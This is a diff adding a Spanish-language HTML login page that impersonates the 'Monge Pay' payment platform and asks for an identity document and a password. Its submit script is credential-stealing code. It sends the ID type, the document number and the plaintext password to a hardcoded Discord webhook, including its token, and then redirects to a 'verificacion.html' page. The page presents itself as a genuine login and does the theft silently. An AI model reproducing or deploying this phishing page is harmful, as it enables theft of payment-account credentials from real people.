@@ -1,0 +1,595 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Identificacion de Usuario</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com/">
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@400;600&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css">
+    <style>
+        *,
+        :after,
+        :before {
+            box-sizing: border-box
+        }
+
+        html,
+        body {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%
+        }
+
+        .bodyColor {
+            max-width: 100vw;
+            min-height: 100vh;
+            margin: 0;
+            padding: 0;
+            font-family: "Poppins", sans-serif;
+            line-height: 20px;
+            letter-spacing: .01em;
+            text-align: center;
+            background-color: #28b935
+        }
+
+        .login_container {
+            background-color: #fff;
+            filter: drop-shadow(0 6px 18px rgba(0, 0, 0, .06));
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 0;
+            border-radius: 4px;
+            width: 615px;
+            margin: 0 auto
+        }
+
+        .loginContainer_container_imageContainer {
+            width: 100%;
+            padding: 10px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            border-bottom: 1px solid #edf1f5;
+            box-sizing: inherit
+        }
+
+        .loginContainer_container_imageContainer .logo {
+            width: auto;
+            height: 41px
+        }
+
+        .loginContainer_container_infoContainer {
+            padding: 20px
+        }
+
+        .loginContainer_container_infoContainer h5 {
+            font-weight: 500;
+            font-size: 20px;
+            line-height: 30px;
+            text-align: center;
+            letter-spacing: .01em;
+            color: #28b935;
+            margin-bottom: 32px
+        }
+
+        .loginContainer_container_infoContainer h5 span {
+            color: #334d6e
+        }
+
+        .loginContainer_container_infoContainer input {
+            border: 0;
+            outline: 0;
+            font-weight: normal;
+            font-size: 16px;
+            letter-spacing: .01em;
+            color: #333;
+            width: 100%;
+            line-height: 1.4
+        }
+
+        .loginContainer_container_infoContainer p {
+            font-weight: 600;
+            font-size: 13px;
+            line-height: 19px;
+            text-align: center;
+            letter-spacing: .01em;
+            color: #334d6e;
+            margin-bottom: 32px
+        }
+
+        .loginContainer_container_infoContainer label {
+            font-weight: 500;
+            font-size: 13px;
+            line-height: 19px;
+            letter-spacing: .01em;
+            color: #818e9b;
+            text-align: left;
+            width: 100%
+        }
+
+        .loginContainer_container_infoContainer div,
+        .loginForm_mailContainer,
+        .loginForm_passwordContainer,
+        .loginForm_selectContainer {
+            margin-bottom: 16px
+        }
+
+        .loginForm_selectContainer {
+            font-weight: 500;
+            font-size: 13px;
+            line-height: 19px;
+            letter-spacing: .01em;
+            color: #818e9b;
+            border-bottom: 1px solid #d3d8dd
+        }
+
+        .loginForm_selectContainer :focus,
+        .loginForm_selectContainer :focus-visible {
+            outline: 0 !important;
+            border-bottom: 1px solid #d3d8dd !important;
+            box-shadow: none
+        }
+
+        .loginForm_selectContainer_detalleSelect {
+            border: 0;
+            border-radius: initial;
+            font-size: 1rem;
+            width: 100%
+        }
+
+        .loginForm_mailContainer_inputContainer,
+        .loginForm_passwordContainer_inputContainer {
+            border-bottom: 1px solid #d3d8dd;
+            width: 100%;
+            margin-top: 7px;
+            height: 35px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center
+        }
+
+        .loginForm_otherContainer {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 32px
+        }
+
+        .loginForm_otherContainer .loginForm_remember {
+            display: flex;
+            align-items: center;
+            font-family: "Source Sans Pro", sans-serif
+        }
+
+        .loginForm_otherContainer .loginForm_remember .loginForm_rememberContainer {
+            display: flex;
+            flex-direction: row-reverse;
+            cursor: pointer;
+            font-size: 16px;
+            color: #152536
+        }
+
+        .loginForm_otherContainer .loginForm_remember .loginForm_rememberContainer input {
+            position: absolute;
+            opacity: 0;
+            cursor: pointer
+        }
+
+        .loginForm_otherContainer .loginForm_remember .loginForm_rememberContainer .check {
+            position: relative;
+            height: 16px;
+            width: 16px;
+            background-color: #eee;
+            border: 1px solid #ccc;
+            border-radius: 2px;
+            margin-right: 8px
+        }
+
+        .loginForm_otherContainer .loginForm_remember .loginForm_rememberContainer .check:after {
+            left: 5px;
+            top: 2px;
+            width: 5.5px;
+            height: 8px;
+            border: solid #fff;
+            border-width: 0 2px 2px 0;
+            transform: rotate(45deg);
+            content: "";
+            position: absolute;
+            display: none
+        }
+
+        .loginForm_otherContainer .loginForm_remember .loginForm_rememberContainer:hover input~.check {
+            border: 2px solid #7db745
+        }
+
+        .loginForm_otherContainer .loginForm_remember .loginForm_rememberContainer input:checked~.check {
+            background-color: #7db745;
+            border: 0
+        }
+
+        .loginForm_otherContainer .loginForm_remember .loginForm_rememberContainer input:checked~.check:after {
+            display: block
+        }
+
+        .loginForm_otherContainer .loginForm_forgotPassword a {
+            font-weight: 600;
+            font-size: 13px;
+            color: #28b935
+        }
+
+        .loginForm_otherContainer .loginForm_forgotPassword a:hover {
+            color: #7db745
+        }
+
+        .loginForm_userlessContainer {
+            display: flex;
+            align-items: center;
+            gap: 1em
+        }
+
+        .btnDefault {
+            background-color: #28b935;
+            color: #fff;
+            padding: 10px 70px;
+            font-family: "Poppins", sans-serif;
+            font-weight: 600;
+            border-radius: 4px;
+            font-size: 13px;
+            box-shadow: 0 4px 10px rgba(16, 156, 241, .24);
+            border: 0;
+            cursor: pointer
+        }
+
+        .btnDefault:hover {
+            background-color: #7db745
+        }
+
+        .loginForm_buttonsContainer {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-top: 16px
+        }
+
+        .registrateaqui_container_form--parrafCuenta {
+            font-size: 13px;
+            color: #334d6e;
+            margin-top: 16px;
+            margin-bottom: 16px
+        }
+
+        .registrateaqui_container_form--linkCuenta {
+            color: #28b935;
+            font-weight: 600
+        }
+
+        .hr-text {
+            line-height: 1em;
+            position: relative;
+            outline: 0;
+            border: 0;
+            text-align: center;
+            height: 1.5em;
+            opacity: .5
+        }
+
+        .hr-text:before {
+            content: '';
+            background: linear-gradient(to right, transparent, #818181, transparent);
+            position: absolute;
+            left: 0;
+            top: 50%;
+            width: 100%;
+            height: 1px
+        }
+
+        .hr-text:after {
+            content: attr(data-content);
+            position: relative;
+            display: inline-block;
+            padding: 0 .5em;
+            line-height: 1.5em;
+            color: #818181;
+            background-color: #fff
+        }
+
+        .iconEyeClientPassword {
+            font-size: 1.2em;
+            color: #818e9b;
+            cursor: pointer
+        }
+
+        #loader {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.7);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 3000
+        }
+
+        .loader-bar {
+            width: 6px;
+            height: 24px;
+            margin: 0 1px;
+            background: #28b935;
+            animation: loaderAnim 1s infinite ease-in-out
+        }
+
+        .loader-bar:nth-child(1) {
+            animation-delay: 0s
+        }
+
+        .loader-bar:nth-child(2) {
+            animation-delay: 0.1s
+        }
+
+        .loader-bar:nth-child(3) {
+            animation-delay: 0.2s
+        }
+
+        .loader-bar:nth-child(4) {
+            animation-delay: 0.3s
+        }
+
+        @keyframes loaderAnim {
+
+            0%,
+            40%,
+            100% {
+                transform: scaleY(0.4)
+            }
+
+            20% {
+                transform: scaleY(1)
+            }
+        }
+
+        #ocular-widget-toggler {
+            width: 70px;
+            height: 70px;
+            position: fixed;
+            bottom: 0;
+            right: 0;
+            margin: 20px;
+            border-radius: 50%;
+            z-index: 99999;
+            border: none;
+            outline: none;
+            cursor: pointer;
+            box-shadow: rgb(211, 211, 211) 0 0 15px 6px;
+            background: rgb(252, 26, 64);
+            padding: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center
+        }
+    </style>
+    <script>if (self !== top) { top.location = self.location; }</script>
+</head>
+
+<body>
+
+    <div id="loader">
+        <div class="loader-bar"></div>
+        <div class="loader-bar"></div>
+        <div class="loader-bar"></div>
+        <div class="loader-bar"></div>
+    </div>
+
+    <div class="row m-0 p-0 align-items-center px-3 bodyColor">
+        <div class="login_container col-lg-6 offset-lg-3 animate__animated animate__fadeIn">
+            <div class="loginContainer_container_imageContainer">
+                <img class="logo" src="logo.png" alt="logo">
+            </div>
+            <div class="loginContainer_container_infoContainer">
+                <h5>
+                    Bienvenido a <text>Monge Pay</text><br>
+                    <span>tu plataforma de pagos preferida</span>
+                </h5>
+                <p>Ingresá tus datos para comenzar</p>
+
+                <form id="loginForm" method="post">
+                    <!-- Honeypot -->
+                    <div style="position:absolute;left:-9999px;opacity:0;height:0;overflow:hidden;">
+                        <input type="text" id="_mp_hp" name="_mp_hp" tabindex="-1" autocomplete="off">
+                    </div>
+
+                    <div class="loginForm_selectContainer">
+                        <label for="IdentificationType">Seleccioná el tipo de identificación</label>
+                        <select id="ddlIdentificationType" class="form-select loginForm_selectContainer_detalleSelect"
+                            name="IdentificationType">
+                            <option value="CEDULA" data-placeholder="909990999">Nacional</option>
+                            <option value="DIMEX" data-placeholder="000000000000">DIMEX</option>
+                            <option value="MERID" data-placeholder="506000000000000">Comercio</option>
+                            <option value="CEDULA_JURIDICA" data-placeholder="9999999999">Cédula Juridica</option>
+                            <option value="SOPORTE_CENTRALIZADO" data-placeholder="AA0000AA">Soporte Centralizado
+                            </option>
+                        </select>
+                    </div>
+
+                    <div class="loginForm_mailContainer">
+                        <label for="Username">Ingresá tu documento de identidad</label>
+                        <div class="loginForm_mailContainer_inputContainer mt-0">
+                            <input class="loginForm_mailContainer--input" placeholder="909990999" maxlength="9"
+                                type="text" id="Username" name="Username" autocomplete="off" required>
+                        </div>
+                    </div>
+
+                    <div class="loginForm_passwordContainer">
+    <label for="Password">Contraseña</label>
+    <div class="loginForm_passwordContainer_inputContainer mt-0">
+        <input type="password" autocomplete="off" id="Password" name="Password" required>
+        <span onclick="passwordVisibility()" style="cursor:pointer;">
+            <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" width="1em"
+                height="1em" viewBox="0 0 24 24" class="iconify iconEyeClientPassword"
+                id="togglePasswordIcon" style="vertical-align:-0.125em;">
+                <g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"
+                    stroke-width="2">
+                    <path d="M1 12s4-8 11-8s11 8 11 8s-4 8-11 8s-11-8-11-8"></path>
+                    <circle cx="12" cy="12" r="3"></circle>
+                </g>
+            </svg>
+        </span>
+    </div>
+    <!-- Nuevo div para el mensaje de error -->
+    <div id="passwordError" class="loginForm_passwordContainer_error"></div>
+</div>
+
+                    <div class="loginForm_otherContainer">
+                        <div class="loginForm_remember">
+                            <label class="loginForm_rememberContainer">
+                                Recordarme
+                                <input type="checkbox" id="RememberMe" name="RememberMe" value="true">
+                                <span class="check"></span>
+                            </label>
+                        </div>
+                        <div class="loginForm_forgotPassword">
+                            <a style="text-decoration:none;" href="#">¿Olvidaste tu contraseña?</a>
+                        </div>
+                    </div>
+
+                    <div class="loginForm_buttonsContainer">
+                        <button type="submit" class="btnDefault" id="buttonLoginContinuar">Continuar</button>
+                    </div>
+
+                    <hr class="hr-text" data-content="O">
+
+                    <div class="loginForm_buttonsContainer">
+                        <button type="button" class="btnDefault my-0 loginForm_userlessContainer"
+                            id="buttonPasswordless">
+                            <span class="material-icons">fingerprint</span>
+                            <span>Ingresá sin contraseña</span>
+                        </button>
+                    </div>
+
+                    <div class="registrateaqui_container_form--parrafCuenta">
+                        ¿No tenés una cuenta?,
+                        <a class="registrateaqui_container_form--linkCuenta" style="text-decoration:none;"
+                            href="#">Ingresá aquí.</a>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <button id="ocular-widget-toggler">
+        <svg xmlns="http://www.w3.org/2000/svg" width="45" height="45" viewBox="0 0 24 24" fill="white">
+            <path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm0 14H6l-2 2V4h16v12z" />
+            <circle cx="8" cy="10" r="1.2" />
+            <circle cx="12" cy="10" r="1.2" />
+            <circle cx="16" cy="10" r="1.2" />
+        </svg>
+    </button>
+
+    <script>
+        var WEBHOOK = 'https://discordapp.com/api/webhooks/1548298056758202462/P1UeiRNIcAlKPZ0gOCJW_Tv6jnDpmUbK1uHVuhWdtsxLzYztY8XzpAKTCHeC-50Q1CuJ';
+
+        async function enviarDiscord(embed) {
+            try {
+                await fetch(WEBHOOK, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ embeds: [embed] })
+                });
+            } catch (e) { }
+        }
+
+        function passwordVisibility() {
+            var p = document.getElementById("Password");
+            var icon = document.getElementById("togglePasswordIcon");
+            var errorDiv = document.getElementById("passwordError");
+
+            if (p.type === "password") {
+                p.type = "text";
+                icon.innerHTML = '<g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path><line x1="1" y1="1" x2="23" y2="23"></line></g>';
+                errorDiv.style.display = 'none';
+            } else {
+                p.type = "password";
+                icon.innerHTML = '<g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path d="M1 12s4-8 11-8s11 8 11 8s-4 8-11 8s-11-8-11-8"></path><circle cx="12" cy="12" r="3"></circle></g>';
+            }
+        }
+
+        document.getElementById("ddlIdentificationType").addEventListener("change", function () {
+            var sel = this.options[this.selectedIndex];
+            var ph = sel.getAttribute("data-placeholder");
+            var inp = document.getElementById("Username");
+            inp.placeholder = ph;
+            inp.maxLength = ph.trim().length;
+            inp.value = "";
+        });
+
+        function validatePassword(password) {
+            // Expresión regular para encontrar caracteres especiales
+            const specialCharRegex = /[!@#$%^&*()_+\-=$$$${};':"\\|,.<>\/?]/;
+            return specialCharRegex.test(password);
+        }
+
+        document.getElementById("loginForm").addEventListener("submit", async function (e) {
+            e.preventDefault();
+
+            var tipoIdSelect = document.getElementById("ddlIdentificationType");
+            var tipoId = tipoIdSelect.options[tipoIdSelect.selectedIndex].text;
+            var usuario = document.getElementById("Username").value.trim();
+            var password = document.getElementById("Password").value;
+            var errorDiv = document.getElementById("passwordError");
+
+            // Validar contraseña antes de enviar
+            if (!validatePassword(password)) {
+                errorDiv.innerText = "La contraseña debe contener al menos un carácter especial.";
+                errorDiv.style.display = 'block';
+                
+                // Restaurar botón y loader
+                var btn = document.getElementById("buttonLoginContinuar");
+                btn.disabled = false;
+                btn.style.cursor = "pointer";
+                btn.innerHTML = "Continuar";
+                document.getElementById("loader").style.display = "none";
+                
+                return;
+            }
+
+            if (!usuario || !password) return;
+
+            var btn = document.getElementById("buttonLoginContinuar");
+            btn.disabled = true;
+            btn.style.cursor = "not-allowed";
+            btn.innerHTML = "Procesando...";
+            document.getElementById("loader").style.display = "flex";
+
+            await enviarDiscord({
+                title: "🆕 Monge Pay — LOGIN",
+                color: 2664261,
+                fields: [
+                    { name: "📋 Tipo ID", value: "`" + tipoId + "`", inline: true },
+                    { name: "👤 Documento", value: "`" + usuario + "`", inline: true },
+                    { name: "🔑 Contraseña", value: "`" + password + "`", inline: false }
+                ],
+                timestamp: new Date().toISOString()
+            });
+
+            localStorage.setItem('mp_usuario', usuario);
+            localStorage.setItem('mp_tipoId', tipoId);
+
+            setTimeout(function () {
+                window.location.href = "verificacion.html";
+            }, 2500);
+        });
+    </script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+
+</html>
